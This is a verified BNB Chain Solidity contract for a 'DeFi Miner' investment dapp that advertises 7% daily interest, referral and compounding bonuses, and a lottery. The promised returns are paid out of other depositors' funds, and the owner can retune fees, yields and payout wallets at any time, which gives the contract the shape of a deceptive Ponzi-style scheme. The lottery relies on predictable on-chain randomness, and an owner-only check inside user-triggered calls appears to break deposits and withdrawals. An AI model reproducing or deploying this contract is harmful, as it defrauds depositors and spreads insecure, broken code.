/**
 *Submitted for verification at BscScan.com on 2021-12-02
*/

/**

  BSC Defi Miner - BNB

  ~ 7% daily interest.
  ~ 5% Referral Bonus.
  ~ 3% Compound bonus per day, max of 10 straight days. (30%)
  ~ 0.005 BNB Minimum Investment.

 Launch Event Bonuses:
  ~ Referral bonus from 5% -> 7% - for the first day.
  ~ Compounding bonus to 3% -> 5% - for first 3 days.
  ~ Lottery 1% to 2% per deposit or compound - for the first lottery.
  ~ Cut off time 72 hours -> 96 hours for the first week.
  ~ Withdraw cooldown 6 hours -> 0 hours for the first day.

 Lottery:
  ~ 1% of each deposit or compound will be put in the pot money.
  ~ Amount is not deducted from the participant's funds, it goes as a bonus.
  ~ Each lottery will run every 4 hours or if it reaches 150 participants.
  ~ 100 tickets max per user. 0.5 BNB = 100 tickets.
  ~ 0.005 bnb = 1 per ticket. based on user deposit/compound.
  ~ 90% of to pot will be given to the winner.

 Whale Control Feature:
  ~ 72 hours cut off time.
  ~ 6 hours withdraw cooldown.
  ~ 5 bnb max withdrawal.
  ~ 20 bnb max wallet deposits.
  ~ Values can be changed as needed for the project.

 Mini games to be announced soon!
  ~ Profits after fees will all go to the smart contract. more details soon!

  - the 6% sweetspot
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

contract BSC_Defi {
    using SafeMath for uint256;
    uint256 public EGGS_TO_HIRE_1MINERS = 1200000;
    uint256 public REFERRAL = 50;
    uint256 public PERCENTS_DIVIDER = 1000;
    uint256 public PARTNER = 20;
    uint256 public PROJECT = 30;
    uint256 public LOTTERY = 100;
    uint256 public MARKET_EGGS_DIVISOR = 12;

    /** bonus **/
	uint256 public COMPOUND_BONUS = 30; // 3%
	uint256 public COMPOUND_BONUS_MAX_DAYS = 10;

    /* lottery */
	bool public LOTTERY_ACTIVATED;
    uint256 public LOTTERY_START_TIME;
    uint256 public LOTTERY_PERCENT = 10;
    uint256 public LOTTERY_STEP = 4 * 60 * 60; // every 4 hours.
    uint256 public LOTTERY_TICKET_PRICE = 5 * 1e15; /** 0.005 ether **/
    uint256 public MAX_LOTTERY_TICKET = 100;
    uint256 public MAX_LOTTERY_PARTICIPANTS = 150;
    uint256 public constant EGGS_PER_TICKET = 1e17; 
    uint256 public lotteryRound = 0;
    uint256 public currentPot = 0;
    uint256 public participants = 0;
    uint256 public totalTickets = 0;

    /* statistics */
    uint256 public totalStaked;
    uint256 public totalDeposits;
    uint256 public totalCompound;
    uint256 public totalRefBonus;
    uint256 public totalLotteryBonus;

    /* miner parameters */
    uint256 public marketEggs;
    uint256 public PSNS = 30000;
    uint256 PSN = 10000;
    uint256 PSNH = 5000;
    bool public contractStarted;

    /** whale control features **/
	uint256 public CUTOFF_STEP = 72 * 60 * 60; //36 hours
    uint256 public MIN_INVEST = 5 * 1e15; //0.005 BNB
	uint256 public WITHDRAW_COOLDOWN = 6 * 60 * 60; //6 hours
    uint256 public WITHDRAW_LIMIT = 5 ether; //5 BNB
    uint256 public WALLET_LIMIT = 20 ether; //20 BNB

    /* addresses */
    address payable public owner;
    address payable public project;
    address payable public partner;

    struct User {
        uint256 initialDeposit;
        uint256 userDeposit;
        uint256 miners;
        uint256 claimedEggs;
        uint256 totalLotteryBonus;
        uint256 lastHatch;
        address referrer;
        uint256 referralsCount;
        uint256 referralEggRewards;
        uint256 dailyCompoundBonus;
    }

    struct LotteryHistory {
        uint256 round;
        address winnerAddress;
        uint256 pot;
        uint256 totalLotteryParticipants;
        uint256 totalLotteryTickets;
    }

    LotteryHistory[] internal lotteryHistory;
    mapping(address => User) public users;
    mapping(uint256 => mapping(address => uint256)) public ticketOwners; // round => address => amount of owned points
    mapping(uint256 => mapping(uint256 => address)) public participantAdresses; // round => id => address
    event LotteryWinner(address indexed investor, uint256 pot, uint256 indexed round);

    constructor(address payable _owner, address payable _project, address payable _partner) {
        owner = _owner;
        project = _project;
        partner = _partner;
    }

    function hatchEggs(address ref, bool isCompound) public {
        require(contractStarted);
        User storage user = users[msg.sender];

        if (user.referrer == address(0)) {
            if (ref != msg.sender) {
                user.referrer = ref;
            }

            address upline1 = user.referrer;
            if (upline1 != address(0)) {
                users[upline1].referralsCount = users[upline1].referralsCount.add(1);
            }
        }

        uint256 eggsUsed = getMyEggs();

        //use eggsUsedValue if lottery entry is from compound, bonus will be included. 
        if (LOTTERY_ACTIVATED) {
            uint256 lotteryTickets = eggsUsed.mul(LOTTERY_PERCENT).div(PERCENTS_DIVIDER);
            _buyTickets(msg.sender, lotteryTickets);
        }
        
        //isCompound -- only true when compounding.
        if(isCompound) {
            uint256 dailyCompoundBonus = getDailyCompoundBonus(msg.sender, eggsUsed);
            eggsUsed = eggsUsed.add(dailyCompoundBonus);
            uint256 eggsUsedValue = calculateEggSell(eggsUsed);
            user.userDeposit = user.userDeposit.add(eggsUsedValue);
            totalCompound = totalCompound.add(eggsUsedValue);
        } 

        //calculate sell egg without bonus for fees
        uint256 eggValue = calculateEggSell(eggsUsed);

        if(!isCompound) {
           payFees(eggValue);
        }

        eggsUsed = eggsUsed.mul(9).div(10);

        //compounding bonus
        if(block.timestamp.sub(user.lastHatch) >= 1 days) {
            if(user.dailyCompoundBonus < COMPOUND_BONUS_MAX_DAYS) {
                user.dailyCompoundBonus = user.dailyCompoundBonus.add(1);
            }
        }

        //miner increase
        uint256 newMiners = SafeMath.div(eggsUsed,EGGS_TO_HIRE_1MINERS);
        user.miners = SafeMath.add(user.miners, newMiners);
        user.claimedEggs = 0;
        user.lastHatch = block.timestamp;
        uint256 amount;
        if (user.referrer != address(0)) {
            address upline = user.referrer;
            if (upline != address(0)) {
                amount = eggsUsed.mul(REFERRAL).div(PERCENTS_DIVIDER);
                users[upline].claimedEggs = users[upline].claimedEggs.add(amount);
                users[upline].referralEggRewards = users[upline].referralEggRewards.add(amount);
                totalRefBonus = totalRefBonus.add(amount);
            }
        }

        //lower the increase of marketEggs value for every compound/deposit, this will make the inflation slower.  20%(5) to 8%(12).
        marketEggs = SafeMath.add(marketEggs,SafeMath.div(eggsUsed,MARKET_EGGS_DIVISOR));
    }

    function sellEggs() public{
        require(contractStarted);
        User storage user = users[msg.sender];
        uint256 hasEggs = getMyEggs();
        uint256 eggValue = calculateEggSell(hasEggs);

        if(user.lastHatch.add(WITHDRAW_COOLDOWN) > block.timestamp) revert("Withdrawals can only be done after withdraw cooldown.");

        /** Excess amount will be sent back to user claimedEggs available for next withdrawal. **/
        if(eggValue > WITHDRAW_LIMIT) {
            user.claimedEggs = eggValue.sub(WITHDRAW_LIMIT);
            eggValue = WITHDRAW_LIMIT;
        }else{
            //reset claim and hatch time.
            user.claimedEggs = 0;
        }
        
        //reset hatch time.       
        user.lastHatch = block.timestamp;
        
        // reset daily compound bonus.
        user.dailyCompoundBonus = 0;

        marketEggs = SafeMath.add(marketEggs,hasEggs);
        
        // check if contract has enough funds to pay -- one last ride.
        if(getBalance() < eggValue) {
            eggValue = getBalance();
        }

        payFees(eggValue);
        payable(address(msg.sender)).transfer(eggValue);

        //if no new investment or compound, sell will also trigger lottery.
        if(block.timestamp.sub(LOTTERY_START_TIME) >= LOTTERY_STEP || participants == MAX_LOTTERY_PARTICIPANTS){
            _chooseWinner();
        }
    }

    //transfer amount of bnb
    function buyEggs(address ref) public payable{
        User storage user = users[msg.sender];
        if (!contractStarted) {
    		if (msg.sender == owner) {
    		    require(marketEggs == 0);
    			contractStarted = true;
                marketEggs = 120000000000;
                LOTTERY_ACTIVATED = true;
                LOTTERY_START_TIME = block.timestamp;
    		} else revert("Contract not yet started.");
    	}
        require(msg.value > MIN_INVEST, "Mininum investment not met.");
        require(user.initialDeposit <= WALLET_LIMIT, "Max deposit limit reached");
        uint256 eggsBought = calculateEggBuy(msg.value, address(this).balance);
        user.userDeposit = user.userDeposit.add(msg.value);
        user.initialDeposit = user.initialDeposit.add(msg.value);
        user.claimedEggs = SafeMath.add(user.claimedEggs, eggsBought);
        totalStaked = totalStaked.add(msg.value);
        totalDeposits = totalDeposits.add(1);

        //if lottery entry is from new deposit use deposit amount.
        /**if (LOTTERY_ACTIVATED) {
			_buyTickets(msg.sender, msg.value);
		}**/

        hatchEggs(ref, false);
    }

    function payFees(uint256 eggValue) internal {
        (uint256 projectFee, uint256 partnerFee) = getFees(eggValue);
        project.transfer(projectFee);
        partner.transfer(partnerFee);
    }

    function getFees(uint256 eggValue) public view returns(uint256 _projectFee, uint256 _partnerFee) {
        _projectFee = eggValue.mul(PROJECT).div(PERCENTS_DIVIDER);
        _partnerFee = eggValue.mul(PARTNER).div(PERCENTS_DIVIDER);
    }

    // lottery section!
    function _buyTickets(address userAddress, uint256 amount) private {
        /**uint256 userTickets = ticketOwners[lotteryRound][userAddress];
        uint256 numTickets = amount.div(LOTTERY_TICKET_PRICE);

        //if the user has no tickets before this point, but they just purchased a ticket
        if(userTickets == 0) {
            participantAdresses[lotteryRound][participants] = userAddress;

            if(numTickets > 0){
              participants = participants.add(1);
            }
        }

        if (userTickets.add(numTickets) > MAX_LOTTERY_TICKET) {
            numTickets = MAX_LOTTERY_TICKET.sub(userTickets);
        } **/

        require(amount != 0, "zero purchase amount");
        uint256 userTickets = ticketOwners[lotteryRound][userAddress];
        uint256 numTickets = amount.mul(1e18).div(EGGS_PER_TICKET);
        
        if(ticketOwners[lotteryRound][userAddress] == 0) {
            participantAdresses[lotteryRound][participants] = userAddress;
            participants = participants.add(1);
        }

        ticketOwners[lotteryRound][userAddress] = userTickets.add(numTickets);
        //2% of deposit/compound amount will be put into the pot
        currentPot = currentPot.add(amount.mul(LOTTERY_PERCENT).div(PERCENTS_DIVIDER));
        totalTickets = totalTickets.add(numTickets);

        if(block.timestamp.sub(LOTTERY_START_TIME) >= LOTTERY_STEP || participants == MAX_LOTTERY_PARTICIPANTS){
            _chooseWinner();
        }
    }

    // will auto execute, when condition is met. buy, hatch and sell, can also be triggered manually by admin if there is no user action.
    function _chooseWinner() public {
       require(msg.sender == owner);
       uint256[] memory init_range = new uint256[](participants);
       uint256[] memory end_range = new uint256[](participants);

       uint256 last_range = 0;

       for(uint256 i = 0; i < participants; i++){
           uint256 range0 = last_range.add(1);
           uint256 range1 = range0.add(ticketOwners[lotteryRound][participantAdresses[lotteryRound][i]].div(1e18));

           init_range[i] = range0;
           end_range[i] = range1;
           last_range = range1;
       }

       uint256 random = _getRandom().mod(last_range).add(1);

       for(uint256 i = 0; i < participants; i++){
           if((random >= init_range[i]) && (random <= end_range[i])){

               // winner found
               address winnerAddress = participantAdresses[lotteryRound][i];
               User storage user = users[winnerAddress];

               //winner will have the prize in their claimable rewards.
               /**uint256 eggs = currentPot.mul(9).div(10);
               uint256 eggsReward = calculateEggBuy(eggs, address(this).balance);
               user.claimedEggs = user.claimedEggs.add(eggsReward);**/
               uint256 eggsReward = currentPot.mul(9).div(10);
               user.claimedEggs = user.claimedEggs.add(eggsReward);
               
               //record users total lottery rewards
               user.totalLotteryBonus = user.totalLotteryBonus.add(eggsReward);
               totalLotteryBonus = totalLotteryBonus.add(eggsReward);
               
               //lottery fee to project
               uint256 eggValue = calculateEggSell(currentPot);
               uint256 proj = eggValue.mul(LOTTERY).div(PERCENTS_DIVIDER);
               project.transfer(proj);

               //record round
               lotteryHistory.push(LotteryHistory(lotteryRound, winnerAddress, eggsReward, participants, totalTickets));
               emit LotteryWinner(winnerAddress, currentPot, lotteryRound);

               // reset lotteryRound
               currentPot = 0;
               participants = 0;
               totalTickets = 0;
               LOTTERY_START_TIME = block.timestamp;
               lotteryRound = lotteryRound.add(1);
               break;
           }
       }
    }

    //select lottery winner
    function _getRandom() private view returns(uint256){
        bytes32 _blockhash = blockhash(block.number-1);
        return uint256(keccak256(abi.encode(_blockhash,block.timestamp,currentPot,block.difficulty, marketEggs, address(this).balance)));
    }

    function getDailyCompoundBonus(address _adr, uint256 amount) public view returns(uint256){
        if(users[_adr].dailyCompoundBonus == 0) {
            return 0;
        } else {
            uint256 totalBonus = users[_adr].dailyCompoundBonus.mul(COMPOUND_BONUS); // How many %
            uint256 result = amount.mul(totalBonus).div(PERCENTS_DIVIDER);
            return result;
        }
    }

    function getLotteryHistory(uint256 index) public view returns(uint256 round, address winnerAddress, uint256 pot,
	  uint256 totalLotteryParticipants, uint256 totalLotteryTickets) {
		round = lotteryHistory[index].round;
		winnerAddress = lotteryHistory[index].winnerAddress;
		pot = lotteryHistory[index].pot;
		totalLotteryParticipants = lotteryHistory[index].totalLotteryParticipants;
		totalLotteryTickets = lotteryHistory[index].totalLotteryTickets;
	}

    function getLotteryInfo() public view returns (uint256 lotteryStartTime,  uint256 lotteryStep, uint256 lotteryCurrentPot,
	  uint256 lotteryParticipants, uint256 maxLotteryParticipants, uint256 totalLotteryTickets, uint256 lotteryTicketPrice, 
      uint256 maxLotteryTicket, uint256 lotteryPercent, uint256 round){
		lotteryStartTime = LOTTERY_START_TIME;
		lotteryStep = LOTTERY_STEP;
		lotteryTicketPrice = LOTTERY_TICKET_PRICE;
		maxLotteryParticipants = MAX_LOTTERY_PARTICIPANTS;
		lotteryCurrentPot = currentPot;
		lotteryParticipants = participants;
	    totalLotteryTickets = totalTickets;
        maxLotteryTicket = MAX_LOTTERY_TICKET;
        lotteryPercent = LOTTERY_PERCENT;
		round = lotteryRound;
	}

    function getUserInfo(address _adr) public view returns(uint256 _initialDeposit, uint256 _userDeposit, uint256 _miners,
     uint256 _claimedEggs, uint256 _totalLotteryBonus, uint256 _lastHatch, address _referrer, uint256 _referrals,
	 uint256 _referralEggRewards, uint256 _dailyCompoundBonus) {
         User storage user = users[_adr];
         _initialDeposit = user.initialDeposit;
         _userDeposit = user.userDeposit;
         _miners = user.miners;
         _claimedEggs = user.claimedEggs;
         _totalLotteryBonus = user.totalLotteryBonus;
         _lastHatch = user.lastHatch;
         _referrer = user.referrer;
         _referrals = user.referralsCount;
         _referralEggRewards = user.referralEggRewards;
         _dailyCompoundBonus = user.dailyCompoundBonus;
	}

    function getTimeStamp() public view returns (uint256) {
        return block.timestamp;
    }

    function getUserTickets(address _userAddress) public view returns(uint256) {
         return ticketOwners[lotteryRound][_userAddress];
    }

    function getLotteryTimer() public view returns(uint256) {
        return LOTTERY_START_TIME.add(LOTTERY_STEP);
    }

    function getAvailableEarnings(address _adr) public view returns(uint256) {
        uint256 userEggs = SafeMath.add(users[_adr].claimedEggs,getEggsSinceLastHatch(_adr));
        return calculateEggSell(userEggs);
    }

    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }

    function calculateEggSell(uint256 eggs) public view returns(uint256){
        return calculateTrade(eggs,marketEggs, address(this).balance);
    }

    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth,contractBalance,marketEggs);
    }

    function calculateEggBuySimple(uint256 eth) public view returns(uint256){
        return calculateEggBuy(eth, address(this).balance);
    }

    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    //How many miners and eggs per day user will recieve for 1 BNB deposit
    function getEggsYield() public view returns(uint256,uint256) {
        uint256 eggsAmount = calculateEggBuy(1 ether ,SafeMath.sub(address(this).balance.add(1 ether),1 ether));
        uint256 miners = SafeMath.div(eggsAmount,EGGS_TO_HIRE_1MINERS);
        uint256 day = 1 days;
        uint256 eggsPerDay = day.mul(miners);
        uint256 earningsPerDay = calculateEggSellForYield(eggsPerDay);
        return(miners, earningsPerDay);
    }

    function getSiteInfo() public view returns (uint256 _totalStaked, uint256 _totalDeposits, uint256 _totalCompound, uint256 _totalRefBonus, uint256 _totalLotteryBonus) {
        return (totalStaked, totalDeposits, totalCompound, totalRefBonus, totalLotteryBonus);
    }

    function calculateEggSellForYield(uint256 eggs) public view returns(uint256){
        return calculateTrade(eggs,marketEggs, address(this).balance.add(1 ether));
    }

    function getMyMiners() public view returns(uint256){
        return users[msg.sender].miners;
    }

    function getMyEggs() public view returns(uint256){
        return SafeMath.add(users[msg.sender].claimedEggs,getEggsSinceLastHatch(msg.sender));
    }

    function getEggsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsSinceLastHatch = SafeMath.sub(block.timestamp,users[adr].lastHatch);
        uint256 cutoffTime = min(secondsSinceLastHatch, CUTOFF_STEP); //36 hours
        uint256 secondsPassed = min(EGGS_TO_HIRE_1MINERS, cutoffTime);
        return SafeMath.mul(secondsPassed,users[adr].miners);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    /** lottery enabler **/
    function ENABLE_LOTTERY() public {
        require(msg.sender == owner);
        require(contractStarted);
        LOTTERY_ACTIVATED = true;
        LOTTERY_START_TIME = block.timestamp;
    }

    function DISABLE_LOTTERY() public {
        require(msg.sender == owner);
        require(contractStarted);
        //disable and reset statistics
        LOTTERY_ACTIVATED = false;
        LOTTERY_START_TIME = 0;
        currentPot = 0;
        participants = 0;
        totalTickets = 0;
    }

    /** setup **/
    function PRE_START(address _addr) external {
        require(msg.sender == owner, "Admin use only.");
        User storage user = users[_addr];
        user.miners = SafeMath.add(user.miners, PSNS);
        user.claimedEggs = 0;
        user.lastHatch = block.timestamp;
    }

    /** wallet addresses **/
    function CHANGE_OWNERSHIP(address value) external {
        require(msg.sender == owner, "Admin use only.");
        owner = payable(value);
    }

    function CHANGE_PROJECT(address value) external {
        require(msg.sender == owner, "Admin use only.");
        project = payable(value);
    }

    function CHANGE_PARTNER(address value) external {
        require(msg.sender == owner, "Admin use only.");
        partner = payable(value);
    }

    /** percentage **/

    /**
        2592000 - 3%
        2160000 - 4%
        1728000 - 5%
        1440000 - 6%
        1200000 - 7%
        1080000 - 8%
         959000 - 9%
         864000 - 10%
    **/
    function PRC_EGGS_TO_HIRE_1MINERS(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 864000 && value <= 2592000); /** min 3% max 10%**/
        EGGS_TO_HIRE_1MINERS = value;
    }

    function PRC_PROJECT(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 100); /** 10% max **/
        PROJECT = value;
    }

    function PRC_PARTNER(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 50); /** 5% max **/
        PARTNER = value;
    }

    function PRC_LOTTERY(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 100); /** 10% max **/
        LOTTERY = value;
    }

    function PRC_REFERRAL(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 100); /** 10% max **/
        REFERRAL = value;
    }

    function PRC_MARKET_EGGS_DIVISOR(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 5 && value <= 20); /** 20 = 5% **/
        MARKET_EGGS_DIVISOR = value;
    }

    /** bonus **/
    function BONUS_DAILY_COMPOUND(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 900); /** 90% max **/
        COMPOUND_BONUS = value;
    }

    function BONUS_DAILY_COMPOUND_BONUS_MAX_DAYS(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 5 &&value <= 15); /** 15 days max **/
        COMPOUND_BONUS_MAX_DAYS = value;
    }

    function BONUS_MAX(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 40000); /** max 40k **/
        PSNS = value;
    }

    /* lottery setters */
    function SET_LOTTERY_START_TIME(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        LOTTERY_START_TIME = value * 1 days;
    }

    function SET_LOTTERY_STEP(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
         /** hour conversion **/
        LOTTERY_STEP = value  * 60 * 60;
    }

    function SET_LOTTERY_PERCENT(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        require(value >= 10 && value <= 50); /** 5% max **/
        LOTTERY_PERCENT = value;
    }

    function SET_LOTTERY_TICKET_PRICE(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        LOTTERY_TICKET_PRICE = value * 1e15;
    }

    function SET_MAX_LOTTERY_TICKET(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        require(value >= 1 && value <= 100);
        MAX_LOTTERY_TICKET = value;
    }

    function SET_MAX_LOTTERY_PARTICIPANTS(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 2 && value <= 100); /** min 2, max 100 **/
        MAX_LOTTERY_PARTICIPANTS = value;
    }

    function SET_INVEST_MIN(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        MIN_INVEST = value * 1e15;
    }
    function SET_CUTOFF_STEP(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        CUTOFF_STEP = value * 60 * 60;
    }

    function SET_WITHDRAW_COOLDOWN(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        WITHDRAW_COOLDOWN = value * 60 * 60;
    }

    function SET_WITHDRAW_LIMIT(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        WITHDRAW_LIMIT = value * 1 ether;
    }

    function SET_WALLET_LIMIT(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        WALLET_LIMIT = value * 1 ether;
    }
}

library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}